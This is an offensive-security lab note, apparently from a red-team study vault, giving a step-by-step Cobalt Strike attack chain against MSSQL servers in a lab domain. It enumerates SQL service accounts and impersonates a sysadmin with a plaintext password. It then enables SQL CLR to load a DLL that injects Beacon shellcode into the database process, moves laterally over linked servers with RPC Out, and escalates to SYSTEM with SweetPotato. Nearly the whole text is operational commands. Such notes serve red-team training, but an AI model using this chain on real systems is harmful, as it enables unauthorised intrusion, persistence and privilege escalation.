
Search for MSSQL servers configured for Kerberos authentication.
```powershell
ldapsearch (&(samAccountType=805306368)(servicePrincipalName=MSSQLSvc*)) --attributes name,samAccountName,servicePrincipalName
```

Basic enumeration - we want to be a sysadmin
```powershell
sql-info lon-db-1
sql-whoami lon-db-1
```

Impersonate a sysadmin user
```powershell
make_token CONTOSO\rsteel Passw0rd!

sql-whoami lon-db-1
```

---

##### SQL CLR RCE

Check if CRL is enabled and enable if needed
```powershell
sql-query lon-db-1 "SELECT value FROM sys.configurations WHERE name = 'clr enabled'"

sql-enableclr lon-db-1
```

 Open Visual Studio and create a new [Class Library (.NET Framework)](obsidian://open?vault=Offensive%20Security&file=root%2FRed%20Teaming%2FCobalt%20Strike%20Assumed%20Breach%2F1.%20Initial%20Access%2FLab) project:
    
    1. Project name: MyProcedure.
    2. Place in the same directory: Checked
    3. Add _smb_x64.xthread.bin_ and set build action to an embedded resource            (threaded shell code).

> We want the shell code running as a thread so if we exit the beacon and it's running in the database process, it won't tear down the database process and just the beacon thread

Use the code found [here](obsidian://open?vault=Offensive%20Security&file=root%2FRed%20Teaming%2FCobalt%20Strike%20Assumed%20Breach%2F1.%20Initial%20Access%2FPayloads%2FSQL%20CLR%20Payload)

 >This will perform classic injection where the Beacon will run inside the MS SQL process.

 Load the DLL onto the server
```powershell
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure
```

Link to existing beacon
```powershell
link lon-db-1 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

Disable SQL CLR 
```powershell
sql-disableclr lon-db-1
```

--- 

##### Lateral movement

Enumerate SQL Links
```powershell
sql-links lon-db-1
```

Verify privileges on linked DB
```powershell
sql-whoami lon-db-1 "" lon-db-2
```

Check if RPC Out is enabled on the link ; enable if required
```powershell
sql-checkrpc lon-db-1

sql-enablerpc lon-db-1 lon-db-2
```

Execute SQL CLR payload on link
```powershell
sql-clr lon-db-1 C:\Users\Attacker\source\repos\MyProcedure\bin\Release\MyProcedure.dll MyProcedure "" lon-db-2
```

Link beacon on link to beacon on DB1
```powershell
‌link lon-db-2 TSVCPIPE-4b2f70b3-ceba-42a5-a4b5-704e1c41337
```

---

##### Privilege Escalation

Enumerate token privileges
```poweshell
execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges
```

Upload payload to service directory
```powershell
cd C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps

upload C:\Payloads\tcp-local_x64.exe
```

Execute payload as SYSTEM with SweetPotato
```powershell
execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
```

Connect to new P2P Beacon
```powershell
connect localhost 1337
```